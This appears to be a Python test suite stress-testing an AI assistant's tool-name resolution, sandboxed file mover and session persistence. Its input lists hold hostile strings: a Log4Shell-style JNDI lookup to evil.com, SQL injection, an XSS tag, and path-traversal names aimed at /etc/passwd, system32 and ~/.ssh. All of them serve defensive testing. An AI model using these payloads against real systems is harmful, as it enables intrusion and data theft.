"""tests/test_m4_challenger_deep_stress.py
Milestone 4 Adversarial Stress Testing & Deep Boundary Fuzzing Suite.
Target:
1. Tool alias resolution fuzzing (resoudre_outil) with hostile inputs (empty strings, special chars, argument collisions).
2. Sandbox security and multi-file directory boundaries in deplacer_fichier (collisions, non-existent files, protected targets).
3. Session persistence atomicity under rapid concurrent loops.
"""

import concurrent.futures
import json
import os
import shutil
import sys
import tempfile
import threading
import time
import unittest
from unittest.mock import patch

PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

import ai
import api
from core import history
from function import files
from tests.e2e.harness import EphemeralSandbox


class TestToolAliasResolutionDeepFuzzing(unittest.TestCase):
    """Contradictory deep fuzzing of tool resolution and parameter normalization."""

    def test_null_bytes_and_control_chars_in_tool_name(self):
        """Hostile tool names with null bytes, control characters, and ANSI codes."""
        hostile_names = [
            "\x00",
            "\x00deplacer_fichier",
            "deplacer\x00_fichier",
            "deplacer_fichier\x00",
            "\r\n\t",
            "\x1b[31mdeplacer_fichier\x1b[0m",
            "move_file\x08\x08",
            "'; DROP TABLE tools; --",
            "../../etc/passwd",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/a}",
        ]
        for name in hostile_names:
            fn, canon, args = ai.resoudre_outil(name)
            # Should not crash, returns tuple
            self.assertIsInstance(canon, str)
            self.assertIsInstance(args, dict)

    def test_extreme_length_and_repeating_hyphens(self):
        """Massive tool name strings (50k chars) and hyphen trains."""
        giant_name = "move-" * 10000 + "files"
        fn, canon, args = ai.resoudre_outil(giant_name)
        self.assertIsNone(fn)
        self.assertEqual(len(canon), len(giant_name))

        hyphen_train = "---deplacer---fichier---"
        fn, canon, args = ai.resoudre_outil(hyphen_train)
        # Replaces '-' with '_', resulting in '___deplacer___fichier___'
        self.assertIsNone(fn)
        self.assertEqual(canon, "___deplacer___fichier___")

    def test_homoglyphs_and_unicode_scripts(self):
        """Cyrillic homoglyphs and unicode full-width characters."""
        # 'dеplacer_fichier' where 'е' is Cyrillic \u0435
        cyrillic_deplacer = "d\u0435placer_fichier"
        fn, canon, args = ai.resoudre_outil(cyrillic_deplacer)
        self.assertIsNone(fn, "Cyrillic homoglyph should not match ASCII tool")

        # Full-width 'ｍｏｖｅ_ｆｉｌｅ'
        fullwidth = "\uff4d\uff4f\uff56\uff45_\uff46\uff49\uff4c\uff45"
        fn, canon, args = ai.resoudre_outil(fullwidth)
        self.assertIsNone(fn)

    def test_non_string_tool_names_types(self):
        """Tool name passed as list, dict, custom object with failing or strange str."""
        class CustomObj:
            def __str__(self):
                return "deplacer-fichier"

        fn, canon, args = ai.resoudre_outil(CustomObj())
        self.assertEqual(canon, "deplacer_fichier")
        self.assertIsNotNone(fn)

        for non_str in ([1, 2], {"a": 1}, True, False, 0.0, 3.14):
            fn, canon, args = ai.resoudre_outil(non_str)
            self.assertIsInstance(canon, str)
            self.assertIsInstance(args, dict)

    def test_argument_synonym_priority_and_collisions(self):
        """Synonym collisions: canonical argument priority over synonyms."""
        # 1. Canonical key already present with non-empty value -> preserved, synonyms discarded
        payload = {
            "chemin_source": "canonical_source.txt",
            "source": "synonym_source.txt",
            "src": "synonym_src.txt",
            "file": "synonym_file.txt",
            "dossier_destination": "canonical_dest",
            "destination": "synonym_dest",
            "target": "synonym_target",
        }
        _, canon, norm = ai.resoudre_outil("deplacer_fichier", payload)
        self.assertEqual(norm["chemin_source"], "canonical_source.txt")
        self.assertEqual(norm["dossier_destination"], "canonical_dest")
        for syn in ("source", "src", "file", "destination", "target"):
            self.assertNotIn(syn, norm)

        # 2. Canonical key present but None -> replaced by first available synonym
        payload_none = {
            "chemin_source": None,
            "source": "rescued_source.txt",
            "dossier_destination": "valid_dest",
        }
        _, _, norm_none = ai.resoudre_outil("deplacer_fichier", payload_none)
        self.assertEqual(norm_none["chemin_source"], "rescued_source.txt")
        self.assertEqual(norm_none["dossier_destination"], "valid_dest")

        # 3. Multiple synonyms without canonical key -> first encountered wins deterministically
        payload_syns = {
            "source": "first_syn.txt",
            "file": "second_syn.txt",
            "destination": "dest_folder",
        }
        _, _, norm_syns = ai.resoudre_outil("deplacer_fichier", payload_syns)
        self.assertEqual(norm_syns["chemin_source"], "first_syn.txt")
        self.assertEqual(norm_syns["dossier_destination"], "dest_folder")
        self.assertNotIn("source", norm_syns)
        self.assertNotIn("file", norm_syns)

    def test_argument_keys_with_whitespace_and_hyphens(self):
        """Synonym keys formatted with hyphens, spaces, and mixed case."""
        payload = {
            "  SOURCE  ": "src.txt",
            "target-dir": "dst_folder",
        }
        _, _, norm = ai.resoudre_outil("deplacer_fichier", payload)
        self.assertEqual(norm.get("chemin_source"), "src.txt")
        self.assertEqual(norm.get("dossier_destination"), "dst_folder")

    def test_argument_values_deep_complex_structures(self):
        """Values that are nested dicts, lists, booleans, ints, or floats."""
        payload = {
            "source": ["file1.txt", "file2.txt", "file3.txt"],
            "destination": "my_folder",
            "extra_meta": {"nested": {"depth": [1, 2, 3]}},
            "flag": True,
            "number": 42,
        }
        _, _, norm = ai.resoudre_outil("deplacer_fichier", payload)
        self.assertEqual(norm["chemin_source"], ["file1.txt", "file2.txt", "file3.txt"])
        self.assertEqual(norm["dossier_destination"], "my_folder")
        self.assertEqual(norm["extra_meta"], {"nested": {"depth": [1, 2, 3]}})
        self.assertEqual(norm["flag"], True)
        self.assertEqual(norm["number"], 42)

    def test_non_string_keys_in_arguments(self):
        """Integer or None keys inside arguments dictionary."""
        payload = {
            123: "numeric_key",
            None: "none_key",
            "source": "valid.txt",
            "destination": "target_folder",
        }
        _, _, norm = ai.resoudre_outil("deplacer_fichier", payload)
        self.assertEqual(norm["chemin_source"], "valid.txt")
        self.assertEqual(norm["dossier_destination"], "target_folder")
        self.assertEqual(norm[123], "numeric_key")
        self.assertEqual(norm[None], "none_key")


class TestSandboxAndMultiFileBoundariesStress(unittest.TestCase):
    """Stress testing of sandbox security, collisions, and multi-file boundaries."""

    def setUp(self):
        self.sandbox = EphemeralSandbox()
        self.user_dir = self.sandbox.__enter__()
        self.test_dir = os.path.join(self.user_dir, "batch_test_area")
        os.makedirs(self.test_dir, exist_ok=True)

    def tearDown(self):
        self.sandbox.__exit__(None, None, None)

    def test_batch_movement_10_files_success(self):
        """Moving 10 files in a single call via list."""
        dest_dir = os.path.join(self.test_dir, "destination")
        os.makedirs(dest_dir, exist_ok=True)

        created_files = []
        for i in range(10):
            p = os.path.join(self.test_dir, f"report_{i:02d}.txt")
            with open(p, "w", encoding="utf-8") as f:
                f.write(f"Content {i}")
            created_files.append(p)

        res = files.deplacer_fichier(created_files, dest_dir)
        self.assertIn("10 fichiers déplacés avec succès", res)
        for i in range(10):
            self.assertFalse(os.path.exists(created_files[i]))
            self.assertTrue(os.path.exists(os.path.join(dest_dir, f"report_{i:02d}.txt")))

    def test_batch_movement_json_string_list(self):
        """Moving files passed as a JSON-encoded list string."""
        dest_dir = os.path.join(self.test_dir, "json_dest")
        os.makedirs(dest_dir, exist_ok=True)

        p1 = os.path.join(self.test_dir, "j1.txt")
        p2 = os.path.join(self.test_dir, "j2.txt")
        for p in (p1, p2):
            with open(p, "w", encoding="utf-8") as f:
                f.write("json test")

        json_arg = json.dumps([p1, p2])
        res = files.deplacer_fichier(json_arg, dest_dir)
        self.assertIn("2 fichiers déplacés avec succès", res)
        self.assertTrue(os.path.exists(os.path.join(dest_dir, "j1.txt")))
        self.assertTrue(os.path.exists(os.path.join(dest_dir, "j2.txt")))

    def test_batch_movement_empty_list(self):
        """Empty list returns explicit message."""
        res = files.deplacer_fichier([], self.test_dir)
        self.assertEqual(res, "Aucun fichier spécifié à déplacer.")

    def test_batch_movement_partial_failures(self):
        """Batch containing 2 valid files and 2 non-existent files."""
        dest_dir = os.path.join(self.test_dir, "partial_dest")
        os.makedirs(dest_dir, exist_ok=True)

        v1 = os.path.join(self.test_dir, "valid1.txt")
        v2 = os.path.join(self.test_dir, "valid2.txt")
        for p in (v1, v2):
            with open(p, "w") as f:
                f.write("data")

        non_exist1 = os.path.join(self.test_dir, "ghost1.txt")
        non_exist2 = os.path.join(self.test_dir, "ghost2.txt")

        batch = [v1, non_exist1, v2, non_exist2]
        res = files.deplacer_fichier(batch, dest_dir)

        self.assertIn("2/4 fichiers déplacés", res)
        self.assertIn("Erreurs :", res)
        self.assertTrue(os.path.exists(os.path.join(dest_dir, "valid1.txt")))
        self.assertTrue(os.path.exists(os.path.join(dest_dir, "valid2.txt")))

    def test_collision_same_directory(self):
        """Moving a file to the folder it is already in triggers collision error."""
        p = os.path.join(self.test_dir, "in_place.txt")
        with open(p, "w") as f:
            f.write("same")

        res = files.deplacer_fichier(p, self.test_dir)
        self.assertIn("Erreur: un fichier du même nom existe déjà", res)
        self.assertTrue(os.path.exists(p))

    def test_collision_in_batch_different_sources_same_basename(self):
        """Moving two files from different subfolders with identical names to same dest."""
        sub_a = os.path.join(self.test_dir, "subA")
        sub_b = os.path.join(self.test_dir, "subB")
        dest = os.path.join(self.test_dir, "merged")
        os.makedirs(sub_a, exist_ok=True)
        os.makedirs(sub_b, exist_ok=True)
        os.makedirs(dest, exist_ok=True)

        fa = os.path.join(sub_a, "report.txt")
        fb = os.path.join(sub_b, "report.txt")
        with open(fa, "w") as f:
            f.write("content A")
        with open(fb, "w") as f:
            f.write("content B")

        res = files.deplacer_fichier([fa, fb], dest)
        # First file moves, second encounters collision
        self.assertIn("1/2 fichiers déplacés", res)
        self.assertIn("un fichier du même nom existe déjà", res)

        # fa was moved, fb was preserved at subB without overwrite
        self.assertFalse(os.path.exists(fa))
        self.assertTrue(os.path.exists(os.path.join(dest, "report.txt")))
        with open(os.path.join(dest, "report.txt"), "r") as f:
            self.assertEqual(f.read(), "content A")
        self.assertTrue(os.path.exists(fb))
        with open(fb, "r") as f:
            self.assertEqual(f.read(), "content B")

    def test_destination_is_an_existing_file_not_dir(self):
        """If destination is a file instead of a directory, returns clear error."""
        src = os.path.join(self.test_dir, "source.txt")
        target_file = os.path.join(self.test_dir, "target_file.txt")
        with open(src, "w") as f:
            f.write("source")
        with open(target_file, "w") as f:
            f.write("target")

        res = files.deplacer_fichier(src, target_file)
        self.assertIn("n'existe pas", res)
        self.assertTrue(os.path.exists(src))

    def test_destination_does_not_exist(self):
        """Destination directory does not exist."""
        src = os.path.join(self.test_dir, "source.txt")
        with open(src, "w") as f:
            f.write("source")

        ghost_dest = os.path.join(self.test_dir, "ghost_folder")
        res = files.deplacer_fichier(src, ghost_dest)
        self.assertIn("n'existe pas", res)
        self.assertTrue(os.path.exists(src))

    def test_sandbox_rejection_external_paths(self):
        """Attempts to move files from/to outside the user profile are strictly blocked."""
        system_file = "C:\\Windows\\System32\\drivers\\etc\\hosts"
        res_source = files.deplacer_fichier(system_file, self.test_dir)
        self.assertIn("Accès refusé", res_source)

        src = os.path.join(self.test_dir, "legit.txt")
        with open(src, "w") as f:
            f.write("data")
        res_dest = files.deplacer_fichier(src, "C:\\Windows\\Temp")
        self.assertIn("Accès refusé", res_dest)
        self.assertTrue(os.path.exists(src))

    def test_sandbox_sensitive_zone_protection(self):
        """Attempts to move files into or out of sensitive zones (.ssh, startup)."""
        src = os.path.join(self.test_dir, "malicious.sh")
        with open(src, "w") as f:
            f.write("echo evil")

        # Destination in .ssh
        ssh_dest = os.path.join(os.path.expanduser("~"), ".ssh")
        res = files.deplacer_fichier(src, ssh_dest)
        self.assertIn("Accès refusé", res)
        self.assertIn("sensible", res)
        self.assertTrue(os.path.exists(src))

    def test_moving_directory_into_self_or_child(self):
        """Moving a directory into itself or its subdirectory is rejected without unhandled crash."""
        dir_a = os.path.join(self.test_dir, "parent_folder")
        child_dir = os.path.join(dir_a, "child_folder")
        os.makedirs(child_dir, exist_ok=True)

        # Attempt to move parent into its own child
        res = files.deplacer_fichier(dir_a, child_dir)
        self.assertTrue("Erreur" in res or "Accès refusé" in res)

    def test_mixed_slashes_and_relative_paths(self):
        """Moving files with mixed forward/backward slashes and relative parent components."""
        dest = os.path.join(self.test_dir, "slash_dest")
        os.makedirs(dest, exist_ok=True)

        src = os.path.join(self.test_dir, "slashed.txt")
        with open(src, "w") as f:
            f.write("slashed content")

        # Mixed slashes
        mixed_src = src.replace("\\", "/")
        mixed_dest = dest.replace("\\", "/") + "/sub/../"

        res = files.deplacer_fichier(mixed_src, mixed_dest)
        self.assertIn("avec succès", res)
        self.assertTrue(os.path.exists(os.path.join(dest, "slashed.txt")))


class TestSessionPersistenceConcurrencyAndAtomicity(unittest.TestCase):
    """Stress testing atomic session persistence under concurrent loads and file locks."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp(prefix="alyx_session_stress_")
        self._orig_dossier = history._dossier_historique
        history._dossier_historique = lambda: self.temp_dir

    def tearDown(self):
        history._dossier_historique = self._orig_dossier
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_rapid_concurrent_save_and_restore_cycles(self):
        """10 threads performing 20 rapid save and restore cycles simultaneously."""
        errors = []

        def worker(thread_id):
            try:
                for cycle in range(20):
                    messages = [
                        {"role": "user", "content": f"User msg {cycle} from thread {thread_id}"},
                        {"role": "assistant", "content": f"Assistant reply {cycle} to thread {thread_id}"},
                    ]
                    # Save to active session
                    ok = history.sauvegarder_etat_session(messages, "session_active")
                    if not ok:
                        errors.append(f"Save failed in thread {thread_id} cycle {cycle}")

                    # Restore
                    loaded = history.charger_etat_session("session_active")
                    if loaded is None or not isinstance(loaded, list):
                        errors.append(f"Restore failed or None in thread {thread_id} cycle {cycle}")
                    else:
                        # Verify integrity: must have valid structure
                        if len(loaded) < 2 or "role" not in loaded[0]:
                            errors.append(f"Corrupt structure in thread {thread_id} cycle {cycle}: {loaded}")
            except Exception as e:
                errors.append(f"Exception in thread {thread_id}: {e}")

        threads = [threading.Thread(target=worker, args=(i,)) for i in range(10)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=10.0)

        self.assertEqual(errors, [], f"Encountered concurrency errors: {errors}")

        # Final verification: session file must exist, be valid JSON, and load cleanly
        final_state = history.charger_etat_session("session_active")
        self.assertIsNotNone(final_state)
        self.assertEqual(len(final_state), 2)

    def test_simulated_transient_windows_file_lock_retry(self):
        """Transient PermissionError on os.replace succeeds on retry."""
        real_replace = os.replace
        attempt_count = 0

        def flaky_replace(src, dst):
            nonlocal attempt_count
            attempt_count += 1
            if attempt_count < 3:
                raise PermissionError("WinError 32: The process cannot access the file")
            return real_replace(src, dst)

        with patch('os.replace', side_effect=flaky_replace):
            messages = [{"role": "user", "content": "flaky lock test"}]
            ok = history.sauvegarder_etat_session(messages, "session_active")
            self.assertTrue(ok, "Save should succeed after retry")
            self.assertEqual(attempt_count, 3)

        restored = history.charger_etat_session("session_active")
        self.assertEqual(restored, messages)

    def test_permanent_windows_file_lock_safe_failure_no_temp_leak(self):
        """Persistent file lock returns False cleanly and leaves no orphaned temp files."""
        def locked_replace(src, dst):
            raise PermissionError("WinError 32: File locked")

        with patch('os.replace', side_effect=locked_replace):
            messages = [{"role": "user", "content": "locked test"}]
            ok = history.sauvegarder_etat_session(messages, "session_active")
            self.assertFalse(ok, "Save must return False when permanently locked")

        # Verify no .tmp files leaked in directory
        tmp_files = [f for f in os.listdir(self.temp_dir) if f.endswith('.tmp')]
        self.assertEqual(tmp_files, [], f"Temporary files leaked: {tmp_files}")

    def test_session_id_sanitization_adversarial_paths(self):
        """Path traversal and special chars in session_id are strictly contained."""
        dangerous_ids = [
            "../../malicious",
            "..\\..\\system32",
            "session/nested/path",
            "session\x00evil",
            "|dir",
            "*wildcard*",
            "   ",
            None,
        ]
        for s_id in dangerous_ids:
            messages = [{"role": "user", "content": f"test {s_id}"}]
            ok = history.sauvegarder_etat_session(messages, s_id)
            self.assertTrue(ok, f"Save should succeed with sanitized name for {s_id}")

            loaded = history.charger_etat_session(s_id)
            self.assertEqual(loaded, messages)

        # Verify all files created remain inside temp_dir and none escaped
        for root, dirs, files_in_dir in os.walk(self.temp_dir):
            for f in files_in_dir:
                full = os.path.join(root, f)
                self.assertTrue(full.startswith(os.path.abspath(self.temp_dir)))

    def test_unserializable_messages_handling(self):
        """Non-serializable objects in messages fail gracefully without corrupted file."""
        class Unserializable:
            pass

        bad_messages = [{"role": "user", "content": Unserializable()}]
        ok = history.sauvegarder_etat_session(bad_messages, "session_active")
        self.assertFalse(ok, "Unserializable payload must return False")

        # Session state should be absent (no corrupt file created)
        loaded = history.charger_etat_session("session_active")
        self.assertIsNone(loaded)

    def test_concurrent_save_load_and_reset_storm(self):
        """Mixed storm of writers, readers, and resets running simultaneously."""
        errors = []
        stop_event = threading.Event()

        def writer(tid):
            i = 0
            while not stop_event.is_set() and i < 30:
                msgs = [{"role": "user", "content": f"msg {i} from writer {tid}"}]
                if not history.sauvegarder_etat_session(msgs, "storm_session"):
                    errors.append(f"Writer {tid} save error at {i}")
                i += 1

        def reader(tid):
            i = 0
            while not stop_event.is_set() and i < 30:
                loaded = history.charger_etat_session("storm_session")
                if loaded is not None:
                    if not isinstance(loaded, list) or (len(loaded) > 0 and "role" not in loaded[0]):
                        errors.append(f"Reader {tid} saw corrupted payload: {loaded}")
                i += 1

        def resetter():
            i = 0
            while not stop_event.is_set() and i < 15:
                history.reinitialiser_etat_session("storm_session")
                time.sleep(0.005)
                i += 1

        threads = (
            [threading.Thread(target=writer, args=(i,)) for i in range(4)] +
            [threading.Thread(target=reader, args=(i,)) for i in range(4)] +
            [threading.Thread(target=resetter) for _ in range(2)]
        )
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=10.0)
        stop_event.set()

        self.assertEqual(errors, [], f"Storm errors: {errors}")


if __name__ == '__main__':
    unittest.main()
